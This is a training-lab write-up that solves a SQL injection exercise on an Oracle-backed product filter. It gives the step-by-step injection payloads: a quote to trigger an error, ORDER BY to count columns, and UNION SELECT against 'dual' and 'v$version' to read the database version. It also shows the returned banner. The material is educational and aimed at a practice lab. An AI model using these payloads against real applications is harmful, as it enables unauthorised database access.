# Lab: SQL injection attack, querying the database type and version on Oracle

### Instructions

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

### Solution

Launching the lab we find the instructions:

```
Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'
```

We know the injection exists in the `category` parameter, and can confirm this by inserting a sing quotation mark `'`, which causes the app to error:

```
/filter?category=Gifts'
```

Using `ORDER BY` we can start enumerating column numbers.

```sql
/filter?category=Gifts' order by 3-- -
```

Gives us a 500 error.

We can assume there are two columns here.

This is confirmed with:

```sql
/filter?category=Gifts' UNION SELECT NULL,NULL FROM dual--
```

From here the DB version can be queried:

```sql
/filter?category=Gifts' UNION SELECT NULL,banner FROM v$version--
```

This returns:

```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```

Which solves the lab.